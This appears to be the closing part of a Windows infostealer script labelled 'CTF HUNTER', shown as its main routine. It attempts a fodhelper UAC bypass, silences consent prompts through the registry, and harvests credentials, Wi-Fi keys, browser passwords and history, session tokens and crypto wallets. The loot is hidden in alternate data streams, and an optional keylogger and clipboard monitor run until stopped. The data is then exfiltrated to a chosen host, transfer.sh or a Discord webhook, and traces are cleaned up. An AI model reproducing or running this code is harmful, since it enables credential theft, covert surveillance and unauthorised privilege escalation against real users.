            print("[*] Not elevated — attempting fodhelper UAC bypass ...")
            launched = elevate_fodhelper()
            if launched:
                print("[*] Elevated process launched — this instance will exit")
                sys.exit(0)   # the new elevated process carries on
            else:
                print("[!] Bypass failed — continuing as standard user")
    else:
        if is_admin():
            print("[*] Running as administrator")

    # If elevated, silence future UAC prompts for this session
    if is_admin():
        if disable_uac_prompt():
            print("[*] UAC consent prompt silenced (ConsentPromptBehaviorAdmin=0)")

    print(f"\nCTF HUNTER  |  {now()}")
    print(f"ADS host    : {ADS_HOST}  (streams: cr bp bh bc ss wl cl kl{{MMDD}})\n")

    collect_credentials()
    collect_browser_passwords()
    collect_browser_history()
    collect_sessions()
    collect_wallets()

    print(f"\n[+] All results written to ADS streams on {ADS_HOST}")
    print(f"    :cr  credentials (incl. Wi-Fi)  :bp  browser passwords")
    print(f"    :bh  browser history            :bc  history CSV")
    print(f"    :ss  sessions/tokens            :wl  wallets")
    print(f"    (use 'dir /r' or Get-Item -Stream * to list streams locally)")

    def _do_exfil(cleanup=True):
        if args.exfil:
            exfiltrate(args.exfil, cleanup=cleanup)
        if args.transfer is not None:
            exfil_transfer_sh(notify_url=args.transfer, cleanup=cleanup)
        if args.discord:
            exfil_discord(args.discord, cleanup=cleanup)

    if args.monitor or args.all:
        # Exfil static collection immediately (cleanup=False — ADS host stays for monitor)
        _do_exfil(cleanup=False)

        kl = start_keylogger()
        cl = start_clipboard_monitor()
        print(f"\n[*] Monitor mode — Ctrl+C to stop and do final exfil")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopped — running final exfil to capture keylog/clipboard")

        # Final exfil picks up keylog + clipboard accumulated during monitor session
        _do_exfil(cleanup=True)
    else:
        _do_exfil(cleanup=True)

if __name__ == "__main__":
    main()
